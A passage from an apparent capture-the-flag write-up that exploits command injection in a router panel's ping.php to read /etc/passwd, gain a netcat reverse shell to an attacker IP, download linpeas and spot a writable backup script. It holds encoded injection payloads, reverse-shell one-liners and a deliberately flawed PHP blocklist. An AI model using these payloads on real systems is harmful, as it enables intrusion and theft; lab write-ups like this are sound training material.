64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.034 ms
64 bytes from 127.0.0.1: icmp_seq=4 ttl=64 time=0.035 ms

--- 127.0.0.1 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3078ms
rtt min/avg/max/mdev = 0.023/0.030/0.035/0.004 ms
uid=33(www-data) gid=33(www-data) groups=33(www-data)
</pre>
```

<br>

<h3>Burp Repeater</h3>

<p><em>Request</em></p>

```bash
POST /myrouterpanel/ping.php HTTP/1.1
Host: 10.201.26.189
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://10.201.26.189/myrouterpanel/
Content-Type: application/x-www-form-urlencoded
Content-Length: 44
Origin: http://10.201.26.189
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i

ip=127.0.0.1%0Acat%20%2fetc%2fpasswd&submit=
```

<p><em>Response</em></p>

```bash
HTTP/1.1 200 OK
Date: Tue, 05 Aug 2025 19:04:37 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 3409
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

<pre>PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.019 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.033 ms
64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.033 ms
64 bytes from 127.0.0.1: icmp_seq=4 ttl=64 time=0.036 ms

--- 127.0.0.1 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3075ms
rtt min/avg/max/mdev = 0.019/0.030/0.036/0.006 ms
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:115::/nonexistent:/usr/sbin/nologin
avahi-autoipd:x:109:116:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
usbmux:x:110:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
rtkit:x:111:117:RealtimeKit,,,:/proc:/usr/sbin/nologin
dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
cups-pk-helper:x:113:120:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
speech-dispatcher:x:114:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false
avahi:x:115:121:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin
saned:x:117:123::/var/lib/saned:/usr/sbin/nologin
nm-openvpn:x:118:124:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin
hplip:x:119:7:HPLIP system user,,,:/run/hplip:/bin/false
whoopsie:x:120:125::/nonexistent:/bin/false
colord:x:121:126:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
fwupd-refresh:x:122:127:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
geoclue:x:123:128::/var/lib/geoclue:/usr/sbin/nologin
pulse:x:124:129:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
gnome-initial-setup:x:125:65534::/run/gnome-initial-setup/:/bin/false
gdm:x:126:131:Gnome Display Manager:/var/lib/gdm3:/bin/false
sssd:x:127:132:SSSD system user,,,:/var/lib/sss:/usr/sbin/nologin
ubuntu:x:1000:1000:ubuntu,,,:/home/ubuntu:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
athena:x:1001:1001::/home/athena:/bin/bash
sshd:x:128:65534::/run/sshd:/usr/sbin/nologin
</pre>
```

<br>

<h3>CyberChef</h3>

<p>

- URL Decode</p>

<img width="1227" height="251" alt="image" src="https://github.com/user-attachments/assets/12865395-a894-4986-b87b-3df2fc0387f2" />

<p>

- ls -lah /home = <code>ls%20-lah%20/home</code></p>

<img width="1229" height="156" alt="image" src="https://github.com/user-attachments/assets/fd7ac812-31f8-49aa-9065-3c6fc9a42354" />


<p>

- athena<br>
- ubuntu</p>

<img width="848" height="330" alt="image" src="https://github.com/user-attachments/assets/38312f7d-a93c-4f3d-906e-d2917f0d54da" />


<p>

- ls -lah /home/athena = <code>ls%20-lah%20/home/athena</code></p>

<img width="898" height="272" alt="image" src="https://github.com/user-attachments/assets/4fa0d50f-9086-4b94-a7dd-a709252b3462" />


<br>

<h3>Reverse Shell Generator</h3>

<img width="1280" height="468" alt="image" src="https://github.com/user-attachments/assets/fa910fd1-821b-46a2-8842-96de6f5e7ccb" />



```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.201.106.232 4444 >/tmp/f
```

<br>

<h3>CyberChef</h3>

<img width="1317" height="201" alt="image" src="https://github.com/user-attachments/assets/c6a03ef6-6aa0-404a-9600-6f5d3274fe67" />


```bash
rm%20/tmp/f;mkfifo%20/tmp/f;cat%20/tmp/f%7C/bin/bash%20-i%202%3E&1%7Cnc%2010.201.106.232%204444%20%3E/tmp/f
```

<br>

<h3>Burp Repeater</h3>

<img width="866" height="275" alt="image" src="https://github.com/user-attachments/assets/a0176964-5c47-4b0f-8876-44785dd50f41" />


<br>





```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.201.106.232 4444 >/tmp/f
```

<br>

<h3>CyberChef</h3>

<img width="1310" height="196" alt="image" src="https://github.com/user-attachments/assets/45a8affe-fe7e-43f2-a9e2-585960133a15" />

```bash
nc 10.201.106.232 4444 -e /bin/bash
```

```bash
nc%2010.201.106.232%204444%20-e%20/bin/bash
```
nc%2010.201.106.232%206666%20-e%20/bin/bash
<br>

<h3>Burp Repeater</h3>

<img width="419" height="269" alt="image" src="https://github.com/user-attachments/assets/f64afc8f-b611-44df-b1b8-06537a52f212" />

<br>

<h3>Shell</h3>

<img width="901" height="326" alt="image" src="https://github.com/user-attachments/assets/8cad0f53-1559-4f33-bbcb-da72fba678f0" />


```bash
:~/Athena# nc -nlvp 4444
Listening on 0.0.0.0 4444
...
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@routerpanel:/var/www/html/myrouterpanel$ export TERM=xterm^Z
[1]+  Stopped                 nc -nlvp 4444
:~/Athena# stty -echo raw;fg
nc -nlvp 4444

www-data@routerpanel:/var/www/html/myrouterpanel$ 
```

<br>

<h3>ping.php</h3>

```bash
www-data@routerpanel:/var/www/html/myrouterpanel$ ls -lah
total 24K
drwxr-xr-x 2 root root 4.0K May 23  2023 .
drwxr-xr-x 3 root root 4.0K Apr 19  2023 ..
-rw-r--r-- 1 root root 1.3K Apr 16  2023 index.html
-rw-r--r-- 1 root root  767 May 23  2023 ping.php
-rw-r--r-- 1 root root 1.3K Apr 16  2023 style.css
-rw-r--r-- 1 root root  211 Apr 15  2023 under-construction.html
```


```bash
www-data@routerpanel:/var/www/html/myrouterpanel$ cat ping.php
<?php
if (isset($_POST['submit'])) {
    $host = $_POST['ip'];

    // Validate input
    if (containsMaliciousCharacters($host)) {
        echo "Attempt hacking!";
        exit;
    }

    // Execute command safely
    $cmd = "ping -c 4 " . $host;
    $output = shell_exec($cmd);

    if (!$output) {
        echo "Failed to execute ping.";
        exit;
    }

    echo "<pre>" . $output . "</pre>";
}

function containsMaliciousCharacters($input) {
    // Define the set of characters to check for
    $maliciousChars = array(';', '&', '|');

    // Check if any of the malicious characters exist in the input
    foreach ($maliciousChars as $char) {
        if (stripos($input, $char) !== false) {
            return true;
        }
    }

    return false;
}
?>
```

<br>

<h3>/home</h3>


```bash
www-data@routerpanel:/var/www/html/myrouterpanel$ cd /home
www-data@routerpanel:/home$ ls -la
total 16
drwxr-xr-x  4 root   root   4096 Apr 16  2023 .
drwxr-xr-x 20 root   root   4096 Apr 16  2023 ..
drwx------ 17 athena athena 4096 Jul 31  2023 athena
drwx------ 15 ubuntu ubuntu 4096 May 23  2023 ubuntu
```

```bash
www-data@routerpanel:/home$ cd athena
bash: cd: athena: Permission denied
```

```bash
www-data@routerpanel:/home$ cd ubuntu
bash: cd: ubuntu: Permission denied
```

<br>

<h3>linpeas.sh</h3>

```bash
:~/Athena# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```


```bash
www-data@routerpanel:/dev/shm$ wget http://10.201.106.232:8000/linpeas.sh
--2025-08-05 12:44:40--  http://10.201.106.232:8000/linpeas.sh
Connecting to 10.201.106.232:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 233380 (228K) [text/x-sh]
Saving to: \u2018linpeas.sh\u2019

linpeas.sh          100%[===================>] 227.91K  --.-KB/s    in 0.001s  

2025-08-05 12:44:40 (273 MB/s) - \u2018linpeas.sh\u2019 saved [233380/233380]
```


```bash
www-data@routerpanel:/dev/shm$ chmod +x linpeas.sh
```


```bash
www-data@routerpanel:/dev/shm$ ./linpeas.sh
```

<img width="802" height="559" alt="image" src="https://github.com/user-attachments/assets/0ef127f8-19c4-4134-8765-fce235ed2101" />


```bash
[+] Searching AD cached hashes
-rw------- 1 root root 430080 Apr 16  2023  /var/lib/samba/private/secrets.tdb

...
====================================( Interesting Files )=====================================
[+] SUID - Check easy privesc, exploits and write perms
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands
/snap/core22/634/usr/bin/chfn		--->	SuSE_9.3/10
/snap/core22/634/usr/bin/chsh
/snap/core22/634/usr/bin/gpasswd
/snap/core22/634/usr/bin/mount		--->	Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
/snap/core22/634/usr/bin/newgrp		--->	HP-UX_10.20
/snap/core22/634/usr/bin/passwd		--->	Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
/snap/core22/634/usr/bin/su
/snap/core22/634/usr/bin/sudo		--->	/sudo$
/snap/core22/634/usr/bin/umount		--->	BSD/Linux(08-1996)
/snap/core22/634/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core22/634/usr/lib/openssh/ssh-keysign
/snap/core22/817/usr/bin/chfn		--->	SuSE_9.3/10
/snap/core22/817/usr/bin/chsh
/snap/core22/817/usr/bin/gpasswd
/snap/core22/817/usr/bin/mount		--->	Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
/snap/core22/817/usr/bin/newgrp		--->	HP-UX_10.20
/snap/core22/817/usr/bin/passwd		--->	Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
/snap/core22/817/usr/bin/su
/snap/core22/817/usr/bin/sudo		--->	/sudo$
/snap/core22/817/usr/bin/umount		--->	BSD/Linux(08-1996)
/snap/core22/817/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core22/817/usr/lib/openssh/ssh-keysign
/snap/snapd/19122/usr/lib/snapd/snap-confine
/snap/snapd/19457/usr/lib/snapd/snap-confine
/snap/core20/1891/usr/bin/chfn		--->	SuSE_9.3/10
/snap/core20/1891/usr/bin/chsh
/snap/core20/1891/usr/bin/gpasswd
/snap/core20/1891/usr/bin/mount		--->	Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
/snap/core20/1891/usr/bin/newgrp		--->	HP-UX_10.20
/snap/core20/1891/usr/bin/passwd		--->	Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
/snap/core20/1891/usr/bin/su
/snap/core20/1891/usr/bin/sudo		--->	/sudo$
/snap/core20/1891/usr/bin/umount		--->	BSD/Linux(08-1996)
/snap/core20/1891/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1891/usr/lib/openssh/ssh-keysign
/snap/core20/1974/usr/bin/chfn		--->	SuSE_9.3/10
/snap/core20/1974/usr/bin/chsh
/snap/core20/1974/usr/bin/gpasswd
/snap/core20/1974/usr/bin/mount		--->	Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
/snap/core20/1974/usr/bin/newgrp		--->	HP-UX_10.20
/snap/core20/1974/usr/bin/passwd		--->	Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
/snap/core20/1974/usr/bin/su
/snap/core20/1974/usr/bin/sudo		--->	/sudo$
/snap/core20/1974/usr/bin/umount		--->	BSD/Linux(08-1996)
/snap/core20/1974/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1974/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/bin/newgrp		--->	HP-UX_10.20
/usr/bin/sudo		--->	/sudo$
/usr/bin/chsh
/usr/bin/umount		--->	BSD/Linux(08-1996)
/usr/bin/su
/usr/bin/gpasswd
/usr/bin/chfn		--->	SuSE_9.3/10


...
[+] Capabilities
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities
/snap/core22/634/usr/bin/ping = cap_net_raw+ep
/snap/core22/817/usr/bin/ping = cap_net_raw+ep
/snap/core20/1891/usr/bin/ping = cap_net_raw+ep
/snap/core20/1974/usr/bin/ping = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/ping = cap_net_raw+ep

...

[+] Backup files?
-rwxr-xr-x 1 root root 3983 Apr  9  2020 /var/lib/app-info/icons/ubuntu-focal-universe/48x48/slbackup-php_web-browser.png
-rwxr-xr-x 1 root root 4189 Apr  9  2020 /var/lib/app-info/icons/ubuntu-focal-universe/48x48/kbackup_kbackup.png
-rwxr-xr-x 1 root root 1665 Apr  9  2020 /var/lib/app-info/icons/ubuntu-focal-universe/48x48/kup-backup_kup.png
-rwxr-xr-x 1 root root 6785 Apr 24  2018 /var/lib/app-info/icons/ubuntu-focal-universe/64x64/luckybackup_luckybackup.png
-rwxr-xr-x 1 root root 6035 Apr  9  2020 /var/lib/app-info/icons/ubuntu-focal-universe/64x64/slbackup-php_web-browser.png
-rwxr-xr-x 1 root root 5509 Apr  9  2020 /var/lib/app-info/icons/ubuntu-focal-universe/64x64/kbackup_kbackup.png
-rwxr-xr-x 1 root root 2168 Apr  9  2020 /var/lib/app-info/icons/ubuntu-focal-universe/64x64/kup-backup_kup.png
-rw-r--r-- 1 root root 191 Mar 16  2023 /var/lib/sgml-base/supercatalog.old
-rw-r--r-- 1 root root 10151 Mar 16  2023 /etc/xml/docbook-xml.xml.old
-rw-r--r-- 1 root root 1219 Mar 16  2023 /etc/xml/sgml-data.xml.old
-rw-r--r-- 1 root root 3210 Mar 16  2023 /etc/xml/catalog.old
-rw-r--r-- 1 root root 673 Mar 16  2023 /etc/xml/xml-core.xml.old
-rw-r--r-- 1 root root 192 May 26  2023 /etc/systemd/system/athena_backup.service
-rw-r--r-- 1 root root 3158 Apr 16  2023 /etc/apt/sources.bak
-rwxr-xr-x 1 root root 14648 Feb 23  2023 /usr/bin/tdbbackup.tdbtools

...
[+] Searching tables inside readable .db/.sqlite files (limit 100)
 -> Extracting tables from /var/lib/PackageKit/transactions.db (limit 20)

 -> Extracting tables from /var/lib/colord/mapping.db (limit 20)

 -> Extracting tables from /var/lib/colord/storage.db (limit 20)

 -> Extracting tables from /var/lib/command-not-found/commands.db (limit 20)

 -> Extracting tables from /var/lib/fwupd/pending.db (limit 20)

 -> Extracting tables from /var/lib/gdm3/.cache/tracker/meta.db (limit 20)
  --> Found interesting column names in nco:Role_nco:hasEmailAddress (output limit 10)
CREATE TABLE "nco:Role_nco:hasEmailAddress" (ID INTEGER NOT NULL, "nco:hasEmailAddress" INTEGER NOT NULL, "nco:hasEmailAddress:graph" INTEGER)
  --> Found interesting column names in nco:EmailAddress (output limit 10)
CREATE TABLE "nco:EmailAddress" (ID INTEGER NOT NULL PRIMARY KEY, "nco:emailAddress" TEXT COLLATE TRACKER UNIQUE, "nco:emailAddress:graph" INTEGER)
  --> Found interesting column names in nco:VoicePhoneNumber (output limit 10)
CREATE TABLE "nco:VoicePhoneNumber" (ID INTEGER NOT NULL PRIMARY KEY, "nco:voiceMail" INTEGER, "nco:voiceMail:graph" INTEGER)
  --> Found interesting column names in nfo:FileDataObject (output limit 10)
CREATE TABLE "nfo:FileDataObject" (ID INTEGER NOT NULL PRIMARY KEY, "nfo:fileLastAccessed" INTEGER, "nfo:fileLastAccessed:graph" INTEGER, "nfo:fileLastAccessed:localDate" INTEGER, "nfo:fileLastAccessed:localTime" INTEGER, "nfo:fileCreated" INTEGER, "nfo:fileCreated:graph" INTEGER, "nfo:fileCreated:localDate" INTEGER, "nfo:fileCreated:localTime" INTEGER, "nfo:fileSize" INTEGER, "nfo:fileSize:graph" INTEGER, "nfo:permissions" TEXT COLLATE TRACKER, "nfo:permissions:graph" INTEGER, "nfo:fileName" TEXT COLLATE TRACKER, "nfo:fileName:graph" INTEGER, "nfo:hasHash" INTEGER, "nfo:hasHash:graph" INTEGER, "nfo:fileOwner" INTEGER, "nfo:fileOwner:graph" INTEGER, "nfo:fileLastModified" INTEGER, "nfo:fileLastModified:graph" INTEGER, "nfo:fileLastModified:localDate" INTEGER, "nfo:fileLastModified:localTime" INTEGER)
100003, 1754417513, 100002, 20305, 65513, None, None, None, None, 4096, 100002, None, None, gdm3, 100002, None, None, None, None, 1681689631, 100002, 19464, 31
  --> Found interesting column names in nfo:FileHash (output limit 10)
CREATE TABLE "nfo:FileHash" (ID INTEGER NOT NULL PRIMARY KEY, "nfo:hashValue" TEXT COLLATE TRACKER, "nfo:hashValue:graph" INTEGER, "nfo:hashAlgorithm" TEXT COLLATE TRACKER, "nfo:hashAlgorithm:graph" INTEGER)
  --> Found interesting column names in nfo:ArchiveItem (output limit 10)
CREATE TABLE "nfo:ArchiveItem" (ID INTEGER NOT NULL PRIMARY KEY, "nfo:isPasswordProtected" INTEGER, "nfo:isPasswordProtected:graph" INTEGER)
  --> Found interesting column names in nmo:Email_nmo:contentMimeType (output limit 10)
CREATE TABLE "nmo:Email_nmo:contentMimeType" (ID INTEGER NOT NULL, "nmo:contentMimeType" TEXT NOT NULL, "nmo:contentMimeType:graph" INTEGER)
  --> Found interesting column names in nmo:Email (output limit 10)
CREATE TABLE "nmo:Email" (ID INTEGER NOT NULL PRIMARY KEY, "nmo:hasContent" INTEGER, "nmo:hasContent:graph" INTEGER, "nmo:isFlagged" INTEGER, "nmo:isFlagged:graph" INTEGER, "nmo:isRecent" INTEGER, "nmo:isRecent:graph" INTEGER, "nmo:status" TEXT COLLATE TRACKER, "nmo:status:graph" INTEGER, "nmo:responseType" TEXT COLLATE TRACKER, "nmo:responseType:graph" INTEGER)
  --> Found interesting column names in ncal:UnionParentClass (output limit 10)
CREATE TABLE "ncal:UnionParentClass" (ID INTEGER NOT NULL PRIMARY KEY, "ncal:lastModified" INTEGER, "ncal:lastModified:graph" INTEGER, "ncal:lastModified:localDate" INTEGER, "ncal:lastModified:localTime" INTEGER, "ncal:trigger" INTEGER, "ncal:trigger:graph" INTEGER, "ncal:created" INTEGER, "ncal:created:graph" INTEGER, "ncal:created:localDate" INTEGER, "ncal:created:localTime" INTEGER, "ncal:url" INTEGER, "ncal:url:graph" INTEGER, "ncal:comment" TEXT COLLATE TRACKER, "ncal:comment:graph" INTEGER, "ncal:summaryAltRep" INTEGER, "ncal:summaryAltRep:graph" INTEGER, "ncal:priority" INTEGER, "ncal:priority:graph" INTEGER, "ncal:location" TEXT COLLATE TRACKER, "ncal:location:graph" INTEGER, "ncal:uid" TEXT COLLATE TRACKER, "ncal:uid:graph" INTEGER, "ncal:requestStatus" INTEGER, "ncal:requestStatus:graph" INTEGER, "ncal:recurrenceId" INTEGER, "ncal:recurrenceId:graph" INTEGER, "ncal:dtstamp" INTEGER, "ncal:dtstamp:graph" INTEGER, "ncal:dtstamp:localDate" INTEGER, "ncal:dtstamp:localTime" INTEGER, "ncal:class" INTEGER, "ncal:class:graph" INTEGER, "ncal:organizer" INTEGER, "ncal:organizer:graph" INTEGER, "ncal:dtend" INTEGER, "ncal:dtend:graph" INTEGER, "ncal:summary" TEXT COLLATE TRACKER, "ncal:summary:graph" INTEGER, "ncal:descriptionAltRep" INTEGER, "ncal:descriptionAltRep:graph" INTEGER, "ncal:commentAltRep" INTEGER, "ncal:commentAltRep:graph" INTEGER, "ncal:sequence" INTEGER, "ncal:sequence:graph" INTEGER, "ncal:contact" TEXT COLLATE TRACKER, "ncal:contact:graph" INTEGER, "ncal:contactAltRep" INTEGER, "ncal:contactAltRep:graph" INTEGER, "ncal:locationAltRep" INTEGER, "ncal:locationAltRep:graph" INTEGER, "ncal:geo" INTEGER, "ncal:geo:graph" INTEGER, "ncal:resourcesAltRep" INTEGER, "ncal:resourcesAltRep:graph" INTEGER, "ncal:dtstart" INTEGER, "ncal:dtstart:graph" INTEGER, "ncal:description" TEXT COLLATE TRACKER, "ncal:description:graph" INTEGER, "ncal:relatedToSibling" TEXT COLLATE TRACKER, "ncal:relatedToSibling:graph" INTEGER, "ncal:duration" INTEGER, "ncal:duration:graph" INTEGER)
  --> Found interesting column names in fts5 (output limit 10)
CREATE VIRTUAL TABLE fts5 USING fts5(content="fts_view", "nco:phoneNumber", "nfo:fontFamily", "nmm:artistName", "nfo:tableOfContents", "nfo:fileName", "nmo:messageSubject", "nfo:genre", "nmm:genre", "mtp:creator", "nco:title", "nco:emailAddress", "nie:keyword", "nmm:category", "nid3:title", "nid3:albumTitle", "nid3:contentType", "nco:nameFamily", "nco:nameGiven", "nco:nameAdditional", "nco:contactGroupName", "nco:fullname", "nco:nickname", "nco:region", "nco:country", "nco:extendedAddress", "nco:streetAddress", "nco:postalcode", "nco:locality", "nco:county", "nco:district", "nco:pobox", "nco:imID", "nco:imNickname", "ncal:comment", "ncal:location", "ncal:summary", "ncal:contact", "ncal:description", "nie:title", "nie:subject", "nie:plainTextContent", "nie:description", "nie:comment", "nao:prefLabel", "nao:description", "nco:department", "nco:role", "nco:note", "nmm:albumTitle", tokenize=TrackerTokenizer)

...
[+] Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files
/dev/mqueue
/dev/mqueue/linpeas.txt
/dev/shm
/dev/shm/linpeas.sh
/run/lock
/run/lock/apache2
/snap/core20/1891/run/lock
/snap/core20/1891/tmp
/snap/core20/1891/var/tmp
/snap/core20/1974/run/lock
/snap/core20/1974/tmp
/snap/core20/1974/var/tmp
/snap/core22/634/run/lock
/snap/core22/634/tmp
/snap/core22/634/var/tmp
/snap/core22/817/run/lock
/snap/core22/817/tmp
/snap/core22/817/var/tmp
/tmp
/usr/share/backup/backup.sh
/var/cache/apache2/mod_cache_disk
/var/crash
/var/lib/BrlAPI
/var/lib/php/sessions
/var/metrics
/var/spool/samba
/var/tmp
...
[+] Finding 'pwd' or 'passw' variables (and interesting php db definitions) inside /home /var/www /var/backups /tmp /etc /root /mnt (limit 70)
/etc/nsswitch.conf:passwd:         files systemd
/etc/pam.d/common-password:password	[success=1 default=ignore]	pam_unix.so obscure sha512
/etc/profile.d/vte-2.91.sh:  local pwd='~'
/etc/profile.d/vte-2.91.sh:  pwd="${pwd//[[:cntrl:]]}"
/etc/samba/smb.conf.example:   pam password change = yes
/etc/samba/smb.conf.example:   passwd chat = *Enter\snew\s*\spassword:* %n\n *Retype\snew\s*\spassword:* %n\n *password\supdated\ssuccessfully* .
/etc/samba/smb.conf.example:   passwd program = /usr/bin/passwd %u
/etc/samba/smb.conf.example:   unix password sync = yes
/etc/security/namespace.init:                gid=$(echo "$passwd" | cut -f4 -d":")
/etc/security/namespace.init:        homedir=$(echo "$passwd" | cut -f6 -d":")
/etc/security/namespace.init:        passwd=$(getent passwd "$user")
/etc/ssl/openssl.cnf:challengePassword		= A challenge password
/etc/ssl/openssl.cnf:challengePassword_max		= 20
/etc/ssl/openssl.cnf:challengePassword_min		= 4
/var/backups/dpkg.status.0: used in a passwd like program. The idea is simple: try to prevent
/var/backups/dpkg.status.0:Depends: passwd, debconf (>= 0.5) | debconf-2.0
```



```bash
www-data@routerpanel:/var/www/html/myrouterpanel$ ls -la /usr/share/backup/backup.sh
-rwxr-xr-x 1 www-data athena 258 May 28  2023 /usr/share/backup/backup.sh
```

```bash
www-data@routerpanel:/var/www/html/myrouterpanel$cat /usr/share/backup/backup.sh
#!/bin/bash

backup_dir_zip=~/backup

mkdir -p "$backup_dir_zip"

cp -r /home/athena/notes/* "$backup_dir_zip"

zip -r "$backup_dir_zip/notes_backup.zip" "$backup_dir_zip"

rm /home/athena/backup/*.txt
rm /home/athena/backup/*.sh

echo "Backup completed..."
```

```bash

```

```bash

```

```bash

```


```bash

```


```bash

```












